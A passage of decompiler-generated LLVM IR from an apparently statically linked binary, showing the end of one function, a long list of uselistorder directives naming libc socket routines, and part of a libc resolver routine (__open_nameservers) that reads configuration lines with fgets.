  %v2_8055d61 = inttoptr i32 %v1_8055d61 to i32*
  store i32 -1, i32* %v2_8055d61, align 4
  %v0_8055d69 = load i32, i32* @esp, align 4
  %v1_8055d69 = add i32 %v0_8055d69, 40
  %v2_8055d69 = inttoptr i32 %v1_8055d69 to i32*
  %v3_8055d69 = load i32, i32* %v2_8055d69, align 4
  %v13_8055d69 = icmp eq i32 %v3_8055d69, -1
  br i1 %v13_8055d69, label %dec_label_pc_8055dbd, label %dec_label_pc_8055d70

dec_label_pc_8055d70:                             ; preds = %dec_label_pc_8055d4a
  %v0_8055d70 = load i32, i32* @ecx, align 4
  %v2_8055d70 = add i32 %v0_8055d69, -4
  %v3_8055d70 = inttoptr i32 %v2_8055d70 to i32*
  store i32 %v0_8055d70, i32* %v3_8055d70, align 4
  %v1_8055d71 = add i32 %v0_8055d69, -8
  %v2_8055d71 = inttoptr i32 %v1_8055d71 to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v2_8055d71, align 4
  %v1_8055d76 = add i32 %v0_8055d69, -12
  %v2_8055d76 = inttoptr i32 %v1_8055d76 to i32*
  store i32 134562611, i32* %v2_8055d76, align 4
  %v1_8055d7b = add i32 %v0_8055d69, 184
  store i32 %v1_8055d7b, i32* %ebx.global-to-local, align 4
  %v2_8055d82 = add i32 %v0_8055d69, -16
  %v3_8055d82 = inttoptr i32 %v2_8055d82 to i32*
  store i32 %v1_8055d7b, i32* %v3_8055d82, align 4
  %v3_8055d83 = call i32 @__pthread_return_void(i32 %v1_8055d51.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055d83, i32* %eax.global-to-local, align 4
  %v0_8055d88 = load i32, i32* @esp, align 4
  %v1_8055d88 = inttoptr i32 %v0_8055d88 to i32*
  store i32 ptrtoint (i8** @global_var_80617a8.550 to i32), i32* %v1_8055d88, align 4
  %v2_8055d8f = call i32 @__pthread_return_0(i32 %v1_8055d51.pre-phi)
  store i32 %v2_8055d8f, i32* %eax.global-to-local, align 4
  %v0_8055d94 = load i32, i32* @esp, align 4
  %v1_8055d94 = add i32 %v0_8055d94, 56
  %v2_8055d94 = inttoptr i32 %v1_8055d94 to i32*
  %v3_8055d94 = load i32, i32* %v2_8055d94, align 4
  store i32 %v3_8055d94, i32* %edx.global-to-local, align 4
  %v1_8055d98 = add i32 %v0_8055d94, 72
  %v2_8055d98 = inttoptr i32 %v1_8055d98 to i32*
  %v3_8055d98 = load i32, i32* %v2_8055d98, align 4
  store i32 %v3_8055d98, i32* %eax.global-to-local, align 4
  %v1_8055d9c = sext i32 %v3_8055d94 to i64
  store i64 %v1_8055d9c, i64* @global_var_80617c0.551, align 64
  %v1_8055da2 = trunc i32 %v3_8055d98 to i16
  store i16 %v1_8055da2, i16* @global_var_805b504.552, align 4
  %v1_8055da8 = inttoptr i32 %v0_8055d94 to i32*
  %v2_8055da8 = load i32, i32* %v1_8055da8, align 4
  store i32 %v2_8055da8, i32* @eax, align 4
  %v3_8055da8 = add i32 %v0_8055d94, 4
  %v1_8055da9 = inttoptr i32 %v3_8055da8 to i32*
  %v2_8055da9 = load i32, i32* %v1_8055da9, align 4
  store i32 %v2_8055da9, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8055da9, align 4
  %v0_8055dac = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055dac, i32* %v1_8055da8, align 4
  %v3_8055dad = call i32 @__pthread_return_void(i32 %v1_8055d51.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055dad, i32* %eax.global-to-local, align 4
  %v0_8055db2 = load i32, i32* @esp, align 4
  %v1_8055db2 = add i32 %v0_8055db2, 32
  %v2_8055db2 = inttoptr i32 %v1_8055db2 to i32*
  store i32 -1, i32* %v2_8055db2, align 4
  br label %dec_label_pc_8055dba

dec_label_pc_8055dba:                             ; preds = %dec_label_pc_8055c2e, %dec_label_pc_8055d70
  %v0_8055dba = load i32, i32* @esp, align 4
  %v1_8055dba = add i32 %v0_8055dba, 16
  br label %dec_label_pc_8055dbd

dec_label_pc_8055dbd:                             ; preds = %dec_label_pc_8055d4a, %dec_label_pc_8055dba
  %v0_8055dbd = phi i32 [ %v0_8055d69, %dec_label_pc_8055d4a ], [ %v1_8055dba, %dec_label_pc_8055dba ]
  %v1_8055dbd = add i32 %v0_8055dbd, 16
  %v2_8055dbd = inttoptr i32 %v1_8055dbd to i32*
  %v3_8055dbd = load i32, i32* %v2_8055dbd, align 4
  store i32 %v3_8055dbd, i32* %eax.global-to-local, align 4
  %v1_8055dc1 = add i32 %v0_8055dbd, 220
  %v1_8055dc7 = inttoptr i32 %v1_8055dc1 to i32*
  %v2_8055dc7 = load i32, i32* %v1_8055dc7, align 4
  store i32 %v2_8055dc7, i32* @ebx, align 4
  %v3_8055dc7 = add i32 %v0_8055dbd, 224
  %v1_8055dc8 = inttoptr i32 %v3_8055dc7 to i32*
  %v2_8055dc8 = load i32, i32* %v1_8055dc8, align 4
  store i32 %v2_8055dc8, i32* @esi, align 4
  %v3_8055dc8 = add i32 %v0_8055dbd, 228
  %v1_8055dc9 = inttoptr i32 %v3_8055dc8 to i32*
  %v2_8055dc9 = load i32, i32* %v1_8055dc9, align 4
  store i32 %v2_8055dc9, i32* @edi, align 4
  %v3_8055dc9 = add i32 %v0_8055dbd, 232
  %v1_8055dca = inttoptr i32 %v3_8055dc9 to i32*
  %v2_8055dca = load i32, i32* %v1_8055dca, align 4
  store i32 %v2_8055dca, i32* @ebp, align 4
  ret i32 %v3_8055dbd

; uselistorder directives
  uselistorder i32 %v0_8055dbd, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055d94, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055d69, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8055d4a, { 1, 0 }
  uselistorder i32 %v1_8055d51.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8055cfc.pre, { 1, 0 }
  uselistorder i32 %v5_8055ccf, { 1, 0 }
  uselistorder i32 %v3_8055ccf, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8055c97, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8055c60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055c2e, { 1, 0 }
  uselistorder i32 %v3_8055c0d, { 1, 0, 2 }
  uselistorder i32 %v0_8055bfe, { 1, 0 }
  uselistorder i32 %v5_8055bf4, { 1, 0 }
  uselistorder i32* %v3_8055bf4, { 1, 0 }
  uselistorder i32 %v0_8055aca81, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8055bf4, { 2, 1, 0 }
  uselistorder i32 %v5_8055bee, { 1, 0 }
  uselistorder i32 %v1_8055bed, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8055be9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055bad, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8055b87, { 1, 0 }
  uselistorder i32 %v1_8055b78, { 1, 0 }
  uselistorder i32 %v0_8055b37, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8055ade, { 1, 2, 0 }
  uselistorder i32 %v0_8055ade, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8055ab8, { 1, 0 }
  uselistorder i32 %v1_8055ab2, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8055aad, { 1, 2, 0 }
  uselistorder i32 %v5_8055ab858, { 1, 0 }
  uselistorder i32 %v5_8055a5a, { 1, 0 }
  uselistorder i32 %v3_8055a5a, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8055a12, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80559f8, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_80559f8, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_80559d7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80559b7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805595d, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8055942, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_805592b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80558b3, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80558a0, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8055866, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8055847, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805582b, { 1, 0 }
  uselistorder i32 %v3_8055820, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_805581d, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_80557c2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_80557bd, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80557a6, { 1, 0 }
  uselistorder i32 %v1_8055772, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805576392, { 2, 1, 0 }
  uselistorder i32 %v3_805577b, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_8055723, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_805571c, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805568e, { 3, 1, 5, 4, 9, 6, 11, 2, 0, 10, 8, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 65, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 2, 1, 0 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 3, 2, 4, 0 }
  uselistorder i32 68, { 6, 0, 3, 4, 5, 1, 2 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 72, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 4, 3, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 7, 6, 5, 4, 3, 2, 8, 0 }
  uselistorder i32 17, { 18, 16, 10, 15, 5, 6, 4, 11, 12, 13, 14, 0, 19, 9, 2, 1, 17, 7, 8, 3 }
  uselistorder i32 176, { 4, 2, 3, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 53, 54, 51, 52, 55, 56 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 0, 4, 2, 1 }
  uselistorder i32 116, { 3, 5, 0, 1, 6, 4, 2 }
  uselistorder i32 84, { 5, 1, 6, 2, 4, 3, 0 }
  uselistorder i32 -12, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 10, 51, 50, 49, 16, 17, 11, 12, 13, 14, 15, 18, 19, 0, 20, 52, 26, 23, 21, 22, 24, 25, 27, 31, 32, 33, 29, 28, 30, 34, 40, 41, 39, 38, 37, 35, 36, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -8, { 10, 4, 3, 5, 2, 6, 7, 8, 9, 11, 50, 45, 48, 46, 49, 51, 52, 47, 17, 18, 12, 13, 14, 15, 16, 19, 20, 21, 22, 24, 0, 23, 1, 25, 27, 28, 26, 29, 30, 31, 32, 37, 38, 36, 35, 34, 33, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 (i32)* @__libc_close, { 16, 15, 14, 17, 22, 21, 20, 19, 18, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -16, { 27, 28, 29, 18, 20, 21, 17, 19, 16, 22, 15, 23, 24, 25, 26, 30, 98, 99, 36, 37, 31, 32, 33, 34, 35, 38, 39, 14, 40, 41, 53, 48, 49, 45, 46, 47, 50, 3, 1, 2, 4, 5, 51, 44, 6, 52, 42, 43, 0, 54, 55, 56, 61, 62, 63, 64, 65, 60, 58, 57, 59, 7, 66, 8, 9, 69, 70, 71, 68, 72, 73, 67, 74, 10, 11, 87, 88, 89, 84, 85, 86, 83, 82, 81, 80, 79, 75, 76, 77, 78, 90, 12, 13, 91, 92, 93, 94, 95, 96, 97 }
  uselistorder i16* @global_var_805b504.552, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 2, 0, 3 }
  uselistorder i64* @global_var_80617c0.551, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80617a8.550 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80617a8.550, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 512, { 10, 3, 11, 12, 5, 6, 0, 1, 2, 7, 8, 9, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8055dbd, { 1, 0 }
  uselistorder label %dec_label_pc_8055dba, { 1, 0 }
  uselistorder label %dec_label_pc_8055d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8055d34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055d21, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8055cfc.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8055cf4, { 1, 0 }
  uselistorder label %dec_label_pc_8055cdb, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055c90, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8055c2e, { 1, 0 }
  uselistorder label %dec_label_pc_8055bfe, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8055bf4, { 1, 0 }
  uselistorder label %dec_label_pc_8055be9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055be6, { 1, 0 }
  uselistorder label %dec_label_pc_8055b61, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055aa9, { 1, 0 }
  uselistorder label %dec_label_pc_805592b, { 1, 0 }
  uselistorder label %dec_label_pc_80558f4, { 1, 0 }
  uselistorder label %dec_label_pc_8055866, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055772, { 1, 0 }
  uselistorder label %dec_label_pc_805575c, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8055dcc = load i32, i32* @ebp, align 4
  store i32 134562611, i32* %stack_var_-216, align 4
  %v3_8055ddb = ptrtoint i32* %stack_var_-216 to i32
  %v2_8055de0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055de0, i32* @eax, align 4
  %v2_8055de8 = call i32 @__pthread_return_void(i32 %v2_8055de0, i32 134562611)
  %v1_8055df4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b508.489 to i32))
  store i32 %v1_8055df4, i32* @eax, align 4
  %v0_8055dfc = load i32, i32* @global_var_8061bf4.490, align 4
  %tmp43 = icmp slt i32 %v0_8055dfc, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8055ff3, label %dec_label_pc_8055e09

dec_label_pc_8055e09:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805a5d0.555 to i32), i32* %stack_var_-216, align 4
  %v2_8055e15 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805a59e.556 to i32), i32 ptrtoint (i32* @global_var_805a5d0.555 to i32))
  store i32 %v2_8055e15, i32* @eax, align 4
  store i32 %v2_8055e15, i32* @ebp, align 4
  %v1_8055e1f = icmp eq i32 %v2_8055e15, 0
  %v1_8055e21 = icmp eq i1 %v1_8055e1f, false
  br i1 %v1_8055e21, label %dec_label_pc_8055fbe.preheader, label %dec_label_pc_8055e27

dec_label_pc_8055e27:                             ; preds = %dec_label_pc_8055e09
  store i32 ptrtoint (i32* @global_var_805a5d0.555 to i32), i32* %stack_var_-216, align 4
  %v2_8055e33 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805a5af.557 to i32), i32 ptrtoint (i32* @global_var_805a5d0.555 to i32))
  store i32 %v2_8055e33, i32* @ebp, align 4
  %v1_8055e3d = icmp eq i32 %v2_8055e33, 0
  %v1_8055e3f = icmp eq i1 %v1_8055e3d, false
  br i1 %v1_8055e3f, label %dec_label_pc_8055fbe.preheader, label %dec_label_pc_8055fe8

dec_label_pc_8055fbe.preheader:                   ; preds = %dec_label_pc_8055e09, %dec_label_pc_8055e27
  %v2_8055fc5 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8055ef9 = add i32 %v3_8055ddb, 164
  %v0_8055fbe103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8055fc5, i32* @ebx, align 4
  %v3_8055fca104 = call i32 @fgets(i32 %v2_8055fc5, i32 128, i32 %v0_8055fbe103)
  store i32 %v3_8055fca104, i32* @eax, align 4
  %v1_8055fd2105 = icmp eq i32 %v3_8055fca104, 0
  %v1_8055fd4106 = icmp eq i1 %v1_8055fd2105, false
  br i1 %v1_8055fd4106, label %dec_label_pc_8055e4b.preheader.lr.ph, label %dec_label_pc_8055fda

dec_label_pc_8055e4b.preheader.lr.ph:             ; preds = %dec_label_pc_8055fbe.preheader
  %v4_8055ee3 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8055e4b.preheader

dec_label_pc_8055e4a:                             ; preds = %dec_label_pc_8055e55
  %v1_8055e4a = add i32 %v0_8055e4a57, 1
  store i32 %v1_8055e4a, i32* @ebx, align 4
  %v1_8055e4b = inttoptr i32 %v1_8055e4a to i8*
  %v2_8055e4b = load i8, i8* %v1_8055e4b, align 1
  %v3_8055e4b = zext i8 %v2_8055e4b to i32
  %v5_8055e4b = and i32 %v6_8055e4b60, -256
  %v6_8055e4b = or i32 %v3_8055e4b, %v5_8055e4b
  store i32 %v6_8055e4b, i32* @ecx, align 4
  %v4_8055e4d = icmp eq i8 %v2_8055e4b, 0
  br i1 %v4_8055e4d, label %dec_label_pc_8055fbe.backedge, label %dec_label_pc_8055e55

dec_label_pc_8055e55:                             ; preds = %dec_label_pc_8055e55.lr.ph, %dec_label_pc_8055e4a
  %v6_8055e4b60 = phi i32 [ %v6_8055e4b55, %dec_label_pc_8055e55.lr.ph ], [ %v6_8055e4b, %dec_label_pc_8055e4a ]
  %v2_8055e4b59 = phi i8 [ %v2_8055e4b52, %dec_label_pc_8055e55.lr.ph ], [ %v2_8055e4b, %dec_label_pc_8055e4a ]
  %v1_8055e4b58 = phi i8* [ %v1_8055e4b51, %dec_label_pc_8055e55.lr.ph ], [ %v1_8055e4b, %dec_label_pc_8055e4a ]
  %v0_8055e4a57 = phi i32 [ %v0_8055e4b.pre, %dec_label_pc_8055e55.lr.ph ], [ %v1_8055e4a, %dec_label_pc_8055e4a ]
  %v2_8055e55 = sext i8 %v2_8055e4b59 to i32
  store i32 %v2_8055e55, i32* @edx, align 4
  store i32 %v0_8055e58.pre, i32* @eax, align 4
  %v2_8055e5d = mul nsw i32 %v2_8055e55, 2
  %v3_8055e5d = add i32 %v0_8055e58.pre, %v2_8055e5d
  %v4_8055e5d = inttoptr i32 %v3_8055e5d to i8*
  %v5_8055e5d = load i8, i8* %v4_8055e5d, align 1
  %v6_8055e5d = and i8 %v5_8055e5d, 32
  %v7_8055e5d = icmp eq i8 %v6_8055e5d, 0
  %v1_8055e61 = icmp eq i1 %v7_8055e5d, false
  br i1 %v1_8055e61, label %dec_label_pc_8055e4a, label %dec_label_pc_8055e63

dec_label_pc_8055e63:                             ; preds = %dec_label_pc_8055e55
  %v10_8055e63 = icmp eq i8 %v2_8055e4b59, 10
  br i1 %v10_8055e63, label %dec_label_pc_8055fbe.backedge, label %dec_label_pc_8055e6c

dec_label_pc_8055fbe.backedge:                    ; preds = %dec_label_pc_8055e4b.preheader, %dec_label_pc_8055e4a, %dec_label_pc_8055f84, %dec_label_pc_8055fb3, %dec_label_pc_8055f8b, %dec_label_pc_8055e63, %dec_label_pc_8055e6c, %dec_label_pc_8055f3d
  %v0_8055fbe = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8055fc5, i32* @ebx, align 4
  %v3_8055fca = call i32 @fgets(i32 %v2_8055fc5, i32 128, i32 %v0_8055fbe)
  store i32 %v3_8055fca, i32* @eax, align 4
  %v1_8055fd2 = icmp eq i32 %v3_8055fca, 0
  %v1_8055fd4 = icmp eq i1 %v1_8055fd2, false
  br i1 %v1_8055fd4, label %dec_label_pc_8055e4b.preheader, label %dec_label_pc_8055fda

dec_label_pc_8055e6c:                             ; preds = %dec_label_pc_8055e63
  %v10_8055e74 = icmp eq i8 %v2_8055e4b59, 35
  %v1_8055e77 = icmp eq i1 %v10_8055e74, false
  br i1 %v1_8055e77, label %dec_label_pc_8055ec8.preheader, label %dec_label_pc_8055fbe.backedge

dec_label_pc_8055ec8.preheader:                   ; preds = %dec_label_pc_8055e6c
  %v2_8055ec86 = load i8, i8* %v1_8055e4b58, align 1
  %v3_8055ec87 = icmp eq i8 %v2_8055ec86, 0
  br i1 %v3_8055ec87, label %dec_label_pc_8055ed4, label %dec_label_pc_8055ecd

dec_label_pc_8055e7e:                             ; preds = %dec_label_pc_8055ecd
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8055e82 = load i32, i32* @esp, align 4
  %v3_8055e82 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8055e82 = add nuw nsw i32 %v3_8055e82, 152
  %v5_8055e82 = add i32 %v4_8055e82, %v1_8055e82
  %v6_8055e82 = inttoptr i32 %v5_8055e82 to i32*
  store i32 %v0_8055e82, i32* %v6_8055e82, align 4
  %v0_8055e8c.pre = load i32, i32* @ebx, align 4
  %v4_8055e8c.pre = load i32, i32* @ecx, align 4
  %v1_8055e8c61 = inttoptr i32 %v0_8055e8c.pre to i8*
  %v2_8055e8c62 = load i8, i8* %v1_8055e8c61, align 1
  %v3_8055e8c63 = zext i8 %v2_8055e8c62 to i32
  %v5_8055e8c64 = and i32 %v4_8055e8c.pre, -256
  %v6_8055e8c65 = or i32 %v3_8055e8c63, %v5_8055e8c64
  %v4_8055e8e66 = icmp eq i8 %v2_8055e8c62, 0
  br i1 %v4_8055e8e66, label %dec_label_pc_8055eab.preheader, label %dec_label_pc_8055e92.lr.ph

dec_label_pc_8055e92.lr.ph:                       ; preds = %dec_label_pc_8055e7e
  %v0_8055e95.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_8055e92

dec_label_pc_8055e8b:                             ; preds = %dec_label_pc_8055ea0
  %v1_8055e8b = add i32 %v0_8055e8b67, 1
  store i32 %v1_8055e8b, i32* @ebx, align 4
  %v1_8055e8c = inttoptr i32 %v1_8055e8b to i8*
  %v2_8055e8c = load i8, i8* %v1_8055e8c, align 1
  %v3_8055e8c = zext i8 %v2_8055e8c to i32
  %v5_8055e8c = and i32 %v6_8055e8c69, -256
  %v6_8055e8c = or i32 %v3_8055e8c, %v5_8055e8c
  %v4_8055e8e = icmp eq i8 %v2_8055e8c, 0
  br i1 %v4_8055e8e, label %dec_label_pc_8055eab.preheader, label %dec_label_pc_8055e92

dec_label_pc_8055e92:                             ; preds = %dec_label_pc_8055e92.lr.ph, %dec_label_pc_8055e8b
  %v6_8055e8c69 = phi i32 [ %v6_8055e8c65, %dec_label_pc_8055e92.lr.ph ], [ %v6_8055e8c, %dec_label_pc_8055e8b ]
  %v2_8055e8c68 = phi i8 [ %v2_8055e8c62, %dec_label_pc_8055e92.lr.ph ], [ %v2_8055e8c, %dec_label_pc_8055e8b ]
  %v0_8055e8b67 = phi i32 [ %v0_8055e8c.pre, %dec_label_pc_8055e92.lr.ph ], [ %v1_8055e8b, %dec_label_pc_8055e8b ]
  %v2_8055e92 = sext i8 %v2_8055e8c68 to i32
  store i32 %v2_8055e92, i32* @edx, align 4
  store i32 %v0_8055e95.pre, i32* @eax, align 4
  %v2_8055e9a = mul nsw i32 %v2_8055e92, 2
  %v3_8055e9a = add i32 %v0_8055e95.pre, %v2_8055e9a
  %v4_8055e9a = inttoptr i32 %v3_8055e9a to i8*
  %v5_8055e9a = load i8, i8* %v4_8055e9a, align 1
  %v6_8055e9a = and i8 %v5_8055e9a, 32
  %v7_8055e9a = icmp eq i8 %v6_8055e9a, 0
  %v1_8055e9e = icmp eq i1 %v7_8055e9a, false
  br i1 %v1_8055e9e, label %dec_label_pc_8055eab.preheader, label %dec_label_pc_8055ea0

dec_label_pc_8055ea0:                             ; preds = %dec_label_pc_8055e92
  %v10_8055ea0 = icmp eq i8 %v2_8055e8c68, 10
  %v1_8055ea3 = icmp eq i1 %v10_8055ea0, false
  br i1 %v1_8055ea3, label %dec_label_pc_8055e8b, label %dec_label_pc_8055eab.preheader

dec_label_pc_8055eab.preheader:                   ; preds = %dec_label_pc_8055ea0, %dec_label_pc_8055e92, %dec_label_pc_8055e8b, %dec_label_pc_8055e7e
  %v0_8055e8b.lcssa = phi i32 [ %v0_8055e8c.pre, %dec_label_pc_8055e7e ], [ %v1_8055e8b, %dec_label_pc_8055e8b ], [ %v0_8055e8b67, %dec_label_pc_8055e92 ], [ %v0_8055e8b67, %dec_label_pc_8055ea0 ]
  %v6_8055e8c.lcssa = phi i32 [ %v6_8055e8c65, %dec_label_pc_8055e7e ], [ %v6_8055e8c, %dec_label_pc_8055e8b ], [ %v6_8055e8c69, %dec_label_pc_8055e92 ], [ %v6_8055e8c69, %dec_label_pc_8055ea0 ]
  %v1_8055eab75 = inttoptr i32 %v0_8055e8b.lcssa to i8*
  %v2_8055eab76 = load i8, i8* %v1_8055eab75, align 1
  %v3_8055eab77 = zext i8 %v2_8055eab76 to i32
  %v5_8055eab78 = and i32 %v6_8055e8c.lcssa, -256
  %v6_8055eab79 = or i32 %v3_8055eab77, %v5_8055eab78
  store i32 %v6_8055eab79, i32* @ecx, align 4
  %v4_8055ead80 = icmp eq i8 %v2_8055eab76, 0
  br i1 %v4_8055ead80, label %dec_label_pc_8055ec4, label %dec_label_pc_8055eb1

dec_label_pc_8055ea7:                             ; preds = %dec_label_pc_8055ebf, %dec_label_pc_8055eb1
  store i8 0, i8* %v1_8055eab82, align 1
  %v0_8055eaa = load i32, i32* @ebx, align 4
  %v1_8055eaa = add i32 %v0_8055eaa, 1
  store i32 %v1_8055eaa, i32* @ebx, align 4
  %v4_8055eab.pre = load i32, i32* @ecx, align 4
  %v1_8055eab = inttoptr i32 %v1_8055eaa to i8*
  %v2_8055eab = load i8, i8* %v1_8055eab, align 1
  %v3_8055eab = zext i8 %v2_8055eab to i32
  %v5_8055eab = and i32 %v4_8055eab.pre, -256
  %v6_8055eab = or i32 %v3_8055eab, %v5_8055eab
  store i32 %v6_8055eab, i32* @ecx, align 4
  %v4_8055ead = icmp eq i8 %v2_8055eab, 0
  br i1 %v4_8055ead, label %dec_label_pc_8055ec4, label %dec_label_pc_8055eb1

dec_label_pc_8055eb1:                             ; preds = %dec_label_pc_8055eab.preheader, %dec_label_pc_8055ea7
  %v2_8055eab83 = phi i8 [ %v2_8055eab, %dec_label_pc_8055ea7 ], [ %v2_8055eab76, %dec_label_pc_8055eab.preheader ]
  %v1_8055eab82 = phi i8* [ %v1_8055eab, %dec_label_pc_8055ea7 ], [ %v1_8055eab75, %dec_label_pc_8055eab.preheader ]
  %v0_8055ec881 = phi i32 [ %v1_8055eaa, %dec_label_pc_8055ea7 ], [ %v0_8055e8b.lcssa, %dec_label_pc_8055eab.preheader ]
